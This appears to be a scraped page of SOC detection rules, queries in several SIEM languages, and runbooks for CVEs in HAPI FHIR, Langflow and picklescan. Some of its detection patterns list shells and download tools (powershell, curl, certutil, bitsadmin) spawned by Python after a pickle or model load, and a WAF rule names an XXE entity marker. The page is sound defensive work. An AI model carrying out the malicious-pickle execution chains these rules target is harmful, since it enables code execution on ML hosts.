Inventory pivot: lists every host running HAPI FHIR with the vulnerable org.hl7.fhir.utilities Maven artifact (< 6.9.10). Drives patching and tells the SOC which hosts to prioritise for the runtime detections (UC1-UC4) until upgraded. Rationale: Article pins the vulnerable artifact (`ca.uhn.hapi.fhir:org.hl7.fhir.utilities`) and the vulnerable file:line (XsltUtilities.java:61/91/106 in <= 6.9.8). Web search confirmed the fix landed in 6.9.10, so the vulnerable range is < 6.9.10. CveId match is the cleanest inventory pivot and directly drives patch prioritisation + scopes UC1-UC4 to the right hosts. Cross-checked against: • https://vulnerability.circl.lu/vuln/ghsa-2f55-g35j-5jmf • https://github.com/advisories/GHSA-2f55-g35j-5jmf
ATT&CKT1190
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Test / lab hosts intentionally running old HAPI FHIR for compatibility testing
  • Containers pinned to a vulnerable version because of an unrelated downstream dependency conflict — true positive for inventory but not actionable until refactor
  • TVM lag — DeviceTvmSoftwareVulnerabilities may not enumerate Java JARs unless the agent indexes them; results may under-report
Response runbook
1) TRIAGE — Confirm the host is actually serving FHIR (listening on a FHIR endpoint, not just a build artifact). Capture HAPI FHIR base version + org.hl7.fhir.utilities version. 2) CONTAIN — For internet-facing FHIR hosts: deploy the UC2 WAF rule (block `<!ENTITY %`) as virtual patch. Schedule emergency upgrade to org.hl7.fhir.utilities >= 6.9.10. 3) HUNT — Enable UC1-UC4 with elevated priority for the listed hosts. Backsearch CommonSecurityLog 30d for any FHIR POST/PUT with XXE markers targeting these hosts. Pull DeviceFileEvents for any sensitive-file read by their JVM (UC3).

| where CveId == "CVE-2026-55471"
| join kind=leftouter (DeviceTvmSoftwareInventory | where SoftwareName has "hl7.fhir.utilities" or SoftwareName has "hapi-fhir" | project DeviceId, InvSoftwareName=SoftwareName, InvSoftwareVersion=SoftwareVersion, InvSoftwareVendor=SoftwareVendor) on DeviceId
| project Timestamp, DeviceName, DeviceId, CveId, VulnerabilitySeverityLevel, SoftwareName, SoftwareVersion, SoftwareVendor, RecommendedSecurityUpdate, InvSoftwareName, InvSoftwareVersion

Anomalous POST volume to Langflow /api/v1/upload/{flow_id} (CVE-2026-55450) AIDelivery High
Detects exploitation of the deprecated unauthenticated upload endpoint by counting POST requests and aggregate request-body bytes per source IP toward the Langflow web tier (default TCP 7860). The advisory confirms no auth, no size limit, and an absolute-path information leak in every response — so a spike to this exact URI from a non-baseline source is article-specific high signal. Rationale: Article gives exact URI '/api/v1/upload/{flow_id}', POST method, default port 7860, and 'no limitations' on size. CIM Web tstats threshold on POST count + bytes_in surfaces both burst and single-large-file attacks; Defender / Falcon use port-7860 connection counts as a fallback since they lack HTTP URI visibility.
ATT&CKT1190 T1499.001
Data sourcesWeb
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer or CI/CD pipeline bulk-uploading flow assets during a model migration
  • Internal load test against the deprecated /upload endpoint pre-1.9.1
  • Integration partner re-uploading flows via the legacy endpoint before customer cutover to 1.9.1
  • Langflow itself replaying queued uploads after a restart or backup restore
  • Internal scanner (Nuclei/Tenable) PoC-checking CVE-2026-55450 against a known host
Suppression filter
| where SourceIP !in ("<cicd_ip_1>", "<internal_scanner_ip>")
Response runbook
1) Triage — confirm Langflow version (<1.9.1 is vulnerable; fix is PR #12831). Check source IP against CI/CD allowlist, validate whether it's an internal scanner. Sum bytes uploaded vs free disk on the host. 2) Contain — block the source IP at the WAF / perimeter, gate /api/v1/upload/* behind an authenticated WAF rule, restart Langflow if disk pressure is degrading service, purge unauthorized files under <cache>/langflow/<flow_id>/. 3) Hunt — pivot on the source IP across all Langflow URIs (other deprecated endpoints may also be unauth); cross-check with UC2/UC3 cache writes; review identity logs for any later legitimate access from the same IP.

File-write storm in Langflow cache directory (CVE-2026-55450 disk exhaustion) AIActions on Objectives High
Detects the impact stage of CVE-2026-55450 — a flood of attacker-controlled files written under the Langflow cache directory using the PoC-confirmed naming layout '<cache>/langflow/<flow_uuid>/<sha256-hex>.<ext>'. Thresholded on file count and total bytes so it fires on disk-exhaustion attempts, not on normal flow saves. Rationale: PoC response exposes the canonical cache path '/Users/ori/Library/Caches/langflow/<flow_id>/<sha256>.txt' — the SHA256-hex filename + per-flow-uuid layout is the same on every OS (platformdirs). The regex anchors filename = 32+ char hex (Langflow's content-hash naming) under a *langflow* parent, so it only fires on the upload code path, not on legitimate model/asset writes elsewhere on disk.
ATT&CKT1499.001
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator bulk-loading a real corpus of flows post-upgrade to 1.9.1 (legit auth'd uploads still write to the same path layout)
  • Backup-restore agent replaying cache files after a Langflow recovery
  • Cluster sync replicating cache content to a new pod or node
  • Container image build copying baked-in flow fixtures into the cache during startup
  • Langflow upgrade script regenerating cache content for migrated flows
Suppression filter
| where InitiatingProcessFileName !in~ ("veeam.exe", "rsync", "backupd", "restic")
Response runbook
1) Triage — confirm the writing process is the Langflow server (uvicorn/python) and not a backup/sync agent; check disk-free on host; sample a few SHA256 filenames and confirm they exist via 'ls /<cache>/langflow/<flow_id>/<sha>.*'; cross-reference Timestamp with web logs for matching POSTs (see UC3). 2) Contain — stop Langflow if disk free <10%, purge unauthorized cache files (DO NOT bulk-delete /langflow/ — it also holds legitimate state, target by flow_id of unknown ownership only), block the source IP at WAF. 3) Hunt — query Web/CommonSecurityLog for /api/v1/upload/{flow_id} POSTs landing on this host in the same window; check whether file-creation continued post-block (proxy bypass / multi-source attack); inventory Langflow versions org-wide via TVM.

Correlation: Langflow /api/v1/upload POST + cache file-creation spike (CVE-2026-55450) AIActions on Objectives High
Joins web access logs (POST to /api/v1/upload/) with filesystem events writing into the Langflow cache directory within the same 5-minute window — confirms the full attack chain (request → on-disk impact) and rules out unrelated cache growth from model loads, replicas, or backups. High-confidence variant for paging. Rationale: Per reviewer feedback #2 — UC1 and UC2 each have residual FP risk (legit bulk uploads can trip either alone), but the join collapses that to near zero: only a host that receives the unauthenticated POSTs AND writes the matching SHA256-named cache files in the same 5-minute bucket survives. Time-window correlation as per the KB pattern-time-window-correlation.

  • Blue-team validation run that PoCs CVE-2026-55450 on a known host

Confirm Langflow version is <1.9.1. 2) Contain — block source IPs from the Posts side at the WAF, gate the endpoint behind auth, free disk if under pressure, purge unauthorized flow_id directories. 3) Hunt — extend the join across the past 7d for any prior persistent abuser from the same /24; sweep TVM for vulnerable Langflow installs (<1.9.1) and prioritize internet-facing first; check whether response status was 201 (info leak occurred) on every survived row.

Vulnerable Langflow exposed to network (CVE-2026-55450 inventory) AIReconnaissance High
Surfaces Langflow installations on tenant hosts with version <1.9.1 — the affected range per the GHSA — joined with DeviceInfo IsInternetFacing, so SOC can prioritise patching internet-reachable hosts before the exploitation UCs fire. Pre-exploit hygiene hunt. Rationale: Article gives the exact affected range (langflow <1.9.1) and CVE ID. TVM tables surface the vulnerable software inventory; joining DeviceInfo's IsInternetFacing gives SOC an immediate patch-priority list. Pre-exploit hunt, no attack telemetry required — the right place to start before the alerting UCs fire.
ATT&CKT1190
Data sourcesVulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Langflow installed in a dev/test environment that's not actually exposed despite the IsInternetFacing flag (offline namespace)
  • Custom Langflow fork named 'langflow' but maintained internally with the patch backported
  • Stale TVM data — host was patched but inventory hasn't refreshed yet
  • Air-gapped lab host where the version string is intentionally left at <1.9.1
  • Pre-1.9.1 install on a host that's only reachable from a private VPC despite the IP being public-class
Suppression filter
| where SoftwareVersion !startswith "1.9.1" and SoftwareVersion !startswith "1.9.2" and SoftwareVersion !startswith "1.10"
Response runbook
1) Triage — confirm SoftwareVersion is genuinely <1.9.1 (string comparison can lie on pre-release tags like 1.9.0rc1); confirm IsInternetFacing by checking the public IP listens on TCP 7860 from outside. 2) Contain — coordinate with the platform owner to upgrade to 1.9.1 (fix is PR #12831); if upgrade can't happen same day, gate /api/v1/upload/* behind auth at the WAF or remove external exposure. 3) Hunt — pivot to UC1/UC2/UC3 historical search for any prior exploitation on the same hosts; check Langflow API access logs for prior anonymous POSTs to /api/v1/upload/ that would indicate the gap was already used.
DeviceTvmSoftwareVulnerabilities
| where CveId =~ "CVE-2026-55450" or (SoftwareName =~ "langflow" and SoftwareVendor in~ ("langflow-ai", "langflow"))

Vulnerable picklescan (<1.0.4 / CVE-2025-1889) present in software inventory AIWeaponization High
Surfaces hosts and developer / ML build agents running picklescan before 1.0.4, which silently passes pickles invoking the module-level profile.run() — attackers can ship a 'clean-scanned' malicious model that still calls exec() on load. Hunting pivot for ML pipelines, MLOps runners, and data-science workstations. Rationale: Targets the exact affected package + version range named in the advisory (picklescan < 1.0.4) and the assigned CveId CVE-2025-1889 (confirmed via the upstream GHSA-7wx9-6375-f5wh). High-fidelity because both predicates come from the vuln advisory text itself. Cross-checked against: • https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh • https://nvd.nist.gov/vuln/detail/CVE-2025-1889 • https://github.com/advisories/GHSA-655q-fx9r-782v
ATT&CKT1588.006 T1027
Data sourcesVulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal ML platform team running picklescan 1.0.3 deliberately while pinned to a vendor image awaiting next release
  • Air-gapped lab VMs without internet, where TVM age outpaces actual upgrade
  • picklescan installed in a transient pip venv that's been torn down — TVM still reports stale state
  • Forks / vendored copies of picklescan that report the package name but already carry the upstream fix
Suppression filter
| where not (DeviceName has_any ("sandbox", "detonation", "malware-lab"))
Response runbook
1) Triage: confirm picklescan version on host (pip show picklescan) and identify whether the host is an MLOps build agent, data-science workstation, or model registry server. Pull recent python.exe execution chains on that host (UC2 query). 2) Contain: schedule pip upgrade picklescan>=1.0.4 in the host's image pipeline; for active MLOps runners, pause pickle/model ingest until upgraded. 3) Hunt: for the same DeviceId, run UC2 over the last 30d to look for python.exe -> shell/LOLBin spawn after a .pkl/.pt/.safetensors load — that's the post-exploitation signature you'd see if a malicious pickle already cleared the scanner.
// CVE-2025-1889 — picklescan <1.0.4 misses module-level profile.run() — exec() bypass
let VulnByCve = DeviceTvmSoftwareVulnerabilities
    | where Timestamp > ago(7d)
    | where CveId =~ "CVE-2025-1889"
    | project Timestamp, DeviceId, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate;
let VulnByVersion = DeviceTvmSoftwareInventory
    | where Timestamp > ago(7d)
    | where SoftwareName has "picklescan"
    | extend Parts = split(SoftwareVersion, ".")
    | extend Major = toint(Parts[0]), Minor = toint(Parts[1]), Patch = toint(Parts[2])
    | where Major < 1 or (Major == 1 and Minor == 0 and Patch < 4)
    | project Timestamp, DeviceId, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId="CVE-2025-1889", VulnerabilitySeverityLevel="Critical", RecommendedSecurityUpdate="Upgrade picklescan to >=1.0.4";
union VulnByCve, VulnByVersion
| summarize arg_max(Timestamp, *) by DeviceId, SoftwareName, SoftwareVersion
| order by Timestamp desc
// CVE-2025-1889 — picklescan <1.0.4 misses module-level profile.run() — exec() bypass
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(7d)
| where CveId =~ "CVE-2025-1889" or (SoftwareName has "picklescan" and SoftwareVersion startswith "1.0.3" or SoftwareVersion startswith "1.0.2" or SoftwareVersion startswith "1.0.1" or SoftwareVersion startswith "1.0.0" or SoftwareVersion startswith "0.")
| project TimeGenerated, DeviceName, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by TimeGenerated desc

Python deserialising a pickle/model file spawns shell or LOLBin (CVE-2025-1889 exec() outcome) AIInstallation Medium
Detects the on-host signature of a malicious pickle that bypassed picklescan via profile.run(): a python interpreter whose command line references a .pkl/.pickle/.pt/.ckpt/.safetensors file or pickle.load/torch.load/joblib.load, then spawns powershell, cmd, wscript, mshta, rundll32, bash, curl, certutil, etc. This is the exec() chain that picklescan <1.0.4 would have green-lit. Rationale: Pivots on the picklescan-CVE-specific artefacts in the advisory: python as the deserialiser, a pickle / model-file extension or known loader API on the parent cmdline, plus the `profile.run` string itself (the exact bypass primitive). Pairs the parent narrowing (python+model-file) with child narrowing (shell/LOLBin) per the kb's process-tree pattern — bare 'python spawns powershell' alone would be a dashboard. Cross-checked against: • https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh • https://nvd.nist.gov/vuln/detail/CVE-2025-1889 • https://github.com/advisories/GHSA-655q-fx9r-782v
ATT&CKT1059.006 T1027
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Data-science notebook cells using subprocess/!shell after torch.load() to invoke a preprocessing CLI
  • ML training pipelines on Windows build agents that joblib.load a model and then call curl.exe to push metrics to a tracking server
  • Jupyter kernels where a .pkl path appears in the kernel launch cmdline and the user later opens a powershell terminal in the notebook UI
  • Pytest harness loading a pickle fixture and then invoking sh.exe / bash.exe (WSL) for an integration step
  • Internal model registry CLI that wraps python + .safetensors and shells out to certutil for hash verification
Suppression filter
| where not (InitiatingProcessFolderPath has_any (@"\Jupyter\", @"\anaconda3\", @"\conda\envs\") and ProcessCommandLine has_any ("pytest", "nbconvert", "papermill")) | where not (DeviceName has_any ("build-", "ci-", "runner-") and ChildImage endswith @"\curl.exe" and ChildCmd has_any ("metrics", "mlflow", "wandb"))
Response runbook
1) Triage: pull full process tree for the alert — confirm the parent python.exe actually opened the .pkl/.pt file (DeviceFileEvents on the same DeviceId+InitiatingProcessId), and inspect the child cmdline for staging behaviour (download, base64, scheduled task). Cross-check picklescan version on the host via UC1. 2) Contain: isolate the host via Defender Live Response; quarantine the offending model file (capture SHA256 and FileOriginUrl — where did the model come from? HuggingFace? Internal artefact repo? Slack drop?). 3) Hunt: search EmailEvents / UrlClickEvents / EmailAttachmentInfo for the model file's SHA256 and origin URL; pivot DeviceFileEvents across the org for the same SHA256 to find other infected hosts; check internal model registries / S3 buckets for the same file.
// CVE-2025-1889 — exec() outcome from a profile.run() pickle that cleared picklescan <1.0.4
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","pythonw.exe","python3.exe","python3.11.exe","python3.12.exe","python3.13.exe")
| where InitiatingProcessCommandLine has_any (".pkl",".pickle",".pt",".ckpt",".safetensors","pickle.load","torch.load","joblib.load","profile.run")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe","wsl.exe","curl.exe","wget.exe","certutil.exe","bitsadmin.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
// CVE-2025-1889 — exec() outcome from a profile.run() pickle that cleared picklescan <1.0.4
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python.exe","pythonw.exe","python3.exe","python3.11.exe","python3.12.exe")
| where ParentProcessCommandLine has_any (".pkl",".pickle",".pt",".ckpt",".safetensors","pickle.load","torch.load","joblib.load","profile.run")
| where TargetProcessName has_any ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe","curl.exe","wget.exe","certutil.exe","bitsadmin.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
title: Python Pickle Deserialisation Spawning Shell or LOLBin (CVE-2025-1889)
id: 7b3a8f1c-9d4e-4a2b-bc6e-3f5a1e8c9b2d
description: Detects a python interpreter referencing a pickle / torch / joblib model file (.pkl, .pickle, .pt, .ckpt, .safetensors) on its command line that then spawns powershell, cmd, wscript, mshta, rundll32, bash, curl, certutil or another LOLBin. This is the on-host signature of a malicious pickle invoking profile.run() — the picklescan <1.0.4 blocklist bypass tracked as CVE-2025-1889.
references:
  - https://github.com/advisories/GHSA-4mpj-78p6-rj59
  - https://github.com/mmaitre314/picklescan/security/advisories/GHSA-7wx9-6375-f5wh
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1889
author: SOC Detection Engineering
date: 2026/06/18
tags:
  - attack.execution
  - attack.t1059.006
  - attack.defense_evasion
  - attack.t1027
logsource:
  category: process_creation
  product: windows
detection:
  parent_python:
    ParentImage|endswith:
      - '\python.exe'
      - '\pythonw.exe'
      - '\python3.exe'
      - '\python3.11.exe'
      - '\python3.12.exe'
  parent_cmd_pickle:
    ParentCommandLine|contains:
      - '.pkl'
      - '.pickle'
      - '.pt'
      - '.ckpt'
      - '.safetensors'
      - 'pickle.load'
      - 'torch.load'
      - 'joblib.load'
      - 'profile.run'
  suspicious_child:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\bash.exe'
      - '\sh.exe'
      - '\curl.exe'
      - '\wget.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
  condition: parent_python and parent_cmd_pickle and suspicious_child
falsepositives:
  - Legitimate ML inference pipelines that shell out for preprocessing (rare on Windows; common on Linux build agents)
  - Jupyter notebook cells using subprocess after a torch.load — common in research workstations
level: high
source:windows.sysmon @EventID:1 @ParentImage:(*\python.exe OR *\Python.exe OR *\pythonw.exe OR *\python3.exe OR *\python3.11.exe OR *\python3.12.exe) @ParentCommandLine:(*.pkl* OR *.pickle* OR *.pt* OR *.ckpt* OR *.safetensors* OR *pickle.load* OR *torch.load* OR *joblib.load* OR *profile.run*) @Image:(*\powershell.exe OR *\PowerShell.exe OR *\pwsh.exe OR *\cmd.exe OR *\CMD.exe OR *\wscript.exe OR *\cscript.exe OR *\mshta.exe OR *\rundll32.exe OR *\regsvr32.exe OR *\bash.exe OR *\sh.exe OR *\curl.exe OR *\wget.exe OR *\certutil.exe OR *\bitsadmin.exe) -@User:*$
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^python(w|3(\.\d+)?)?\.exe$/i
| regex("(\\.pkl|\\.pickle|\\.pt|\\.ckpt|\\.safetensors|pickle\\.load|torch\\.load|joblib\\.load|profile\\.run)", field=ParentCommandLine)
| ImageFileName=/\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|bash|sh|wsl|curl|wget|certutil|bitsadmin)\.exe$/i
| UserName!=/\$$/
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine, ParentCommandLine], function=count())
| count > 0
ENDPOINT

| `drop_dm_object_name(Processes)`

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.parent_process) as parent_process values(Processes.process) as process from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("python.exe","pythonw.exe","python3.exe","python3.11.exe","python3.12.exe") AND (Processes.parent_process="*.pkl*" OR Processes.parent_process="*.pickle*" OR Processes.parent_process="*.pt*" OR Processes.parent_process="*.ckpt*" OR Processes.parent_process="*.safetensors*" OR Processes.parent_process="*pickle.load*" OR Processes.parent_process="*torch.load*" OR Processes.parent_process="*joblib.load*")) AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe","wsl.exe","curl.exe","wget.exe","certutil.exe","bitsadmin.exe") AND NOT Processes.user="*$" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name

Vulnerable picklescan (CVE-2025-71325) inventory via TVM AIWeaponization High
Identifies managed devices reporting picklescan versions earlier than 0.0.27, which contain the _list_globals STACK_GLOBAL parsing flaw that lets malicious pickle files bypass scanning. Run as exposure-management hunt to find ML/data-science hosts whose pickle scanner cannot be trusted until upgraded. Rationale: Uses the article's specific CVE (CVE-2025-71325) and the fix version threshold (>= 0.0.27). Cross-checked against the primary advisory GHSA-9gvj-pp9x-gcfr and JFrog's PyTorch / PickleScan writeup to confirm the affected-version range and that the fix landed in 0.0.27. Cross-checked against: • https://github.com/advisories/GHSA-9gvj-pp9x-gcfr • https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr • https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/
ATT&CKT1195.001 T1190
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Air-gapped lab hosts intentionally pinned to an older picklescan for reproducibility — confirm with the ML team before remediating
  • Container images baked with the vulnerable version where the running pod is short-lived — TVM may flag the base layer rather than a live host
  • Hosts that pip-installed picklescan into a project venv that TVM doesn't enumerate — absence is not safety, pair with UC2
  • Test/staging endpoints that already have remediation tickets open
Suppression filter
| where SoftwareVendor !~ "unknown" and VulnerabilitySeverityLevel in~ ("High","Critical")
Response runbook
1) Triage: pivot off DeviceName to confirm the host is genuinely in scope (ML / data-science role, has access to externally-sourced pickle/safetensors files). Pull SoftwareVersion and confirm < 0.0.27. 2) Contain: open a P3 patch ticket pinning picklescan >= 0.0.27; if the host has pulled any HuggingFace / external pickle artifacts in the last 30 days, escalate to scan those artifacts with the patched scanner before any further model loads. 3) Hunt: run UC2 to identify all picklescan invocations on this host and across the fleet so coverage gaps in TVM (project venvs, conda envs) are closed. Cross-check DeviceFileEvents for *.pkl / *.bin / *.pt writes initiated by python.exe in the last 14 days.

Picklescan CLI invocation on endpoint (vulnerable-scanner exposure hunt) AIInstallation Low
Surfaces hosts that execute picklescan (CLI binary or `python -m picklescan`) so the SOC can map where the vulnerable defensive scanner is actually being used in workflows. Pairs with the TVM hunt to catch installs that live in project venvs / conda envs that TVM can't enumerate. Rationale: Picklescan is invoked either as a console_scripts entrypoint (picklescan.exe / picklescan) or via `python -m picklescan`. Pivoting on both forms is grounded in the project's documented CLI surface. Cross-checked the JFrog write-up which lists the same invocation patterns when describing affected workflows. Cross-checked against: • https://github.com/advisories/GHSA-9gvj-pp9x-gcfr • https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/ • https://github.com/mmaitre314/picklescan
ATT&CKT1195.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Legitimate ML/data-science teams running picklescan as part of their model-ingestion pipeline — expected and benign
  • HuggingFace Hub clients that auto-invoke picklescan when fetching pickle-backed models
  • CI/CD runners scanning third-party model artifacts pre-build
  • Security tooling (e.g. ModelScan, custom wrappers) that calls picklescan internally
Suppression filter
| where InitiatingProcessFileName !in~ ("pip.exe","pip3.exe","setup.exe") and InitiatingProcessCommandLine !has "pip install"
Response runbook
1) Triage: per host, determine whether picklescan is invoked by an ML pipeline (expected) or a one-off interactive session (worth a follow-up). Pull the version string by joining with DeviceTvmSoftwareInventory or running `picklescan --version`. 2) Contain: no immediate containment — this is exposure mapping. Where version < 0.0.27, raise a patch ticket and flag any pickle artifacts scanned in the last 30 days as potentially-unverified (need re-scan with 0.0.27+). 3) Hunt: from the same hosts pivot on DeviceFileEvents for downloads of *.pkl, *.bin, *.pt, *.ckpt, *.safetensors from huggingface.co / *.amazonaws.com / public mirrors in the 7 days before each picklescan invocation; on a parent DeviceProcessEvents pivot, watch for python.exe spawning cmd.exe / powershell.exe shortly after a pickle scan returns clean — classic post-bypass code-execution shape.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "picklescan"
   or FileName =~ "picklescan.exe"
   or (FileName in~ ("python.exe","python3.exe","pythonw.exe") and ProcessCommandLine has_any ("-m picklescan","picklescan.cli","picklescan.scanner"))
| where AccountName !endswith "$"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Invocations=count(), SampleCmd=any(ProcessCommandLine), SampleParent=any(InitiatingProcessFileName) by DeviceName, AccountName, FileName
| order by LastSeen desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "picklescan"
   or NewProcessName endswith "\\picklescan.exe"
   or (NewProcessName has_any ("\\python.exe","\\python3.exe","\\pythonw.exe") and CommandLine has_any ("-m picklescan","picklescan.cli","picklescan.scanner"))
| where TargetUserName !endswith "$"
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Invocations=count(), SampleCmd=any(CommandLine), SampleParent=any(ParentProcessName) by Computer, TargetUserName, NewProcessName
| order by LastSeen desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.

Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-50203")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-50203")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-50203")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-50203")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
